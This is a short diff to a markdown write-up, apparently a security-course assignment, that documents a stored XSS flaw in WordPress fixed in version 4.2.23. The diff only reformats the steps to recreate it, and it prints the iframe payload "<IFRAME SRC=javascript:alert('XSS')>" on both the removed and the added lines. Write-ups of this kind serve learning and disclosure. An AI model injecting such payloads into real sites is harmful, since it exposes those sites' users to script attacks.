@@ -13,12 +13,12 @@ Time spent: 8 hours spent in total
     - Fixed in version: 4.2.23
   - [ ] GIF Walkthrough: 
   - [ ] Steps to recreate: 
-        >Sign in as a user or administrator.
-        >Click reply to the post.
-        >In comment input a basic malicious XSS code using iframe. 
-        ```
-        <IFRAME SRC="javascript:alert('XSS');"></IFRAME>
-        ```
+    * Sign in as a user or administrator.
+    * Click reply to the post.
+    * In comment input a basic malicious XSS code using iframe. 
+    ```
+    <IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+    ```
   - [ ] Affected source code:
     - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
 ### 2. (Required) Vulnerability Name or ID
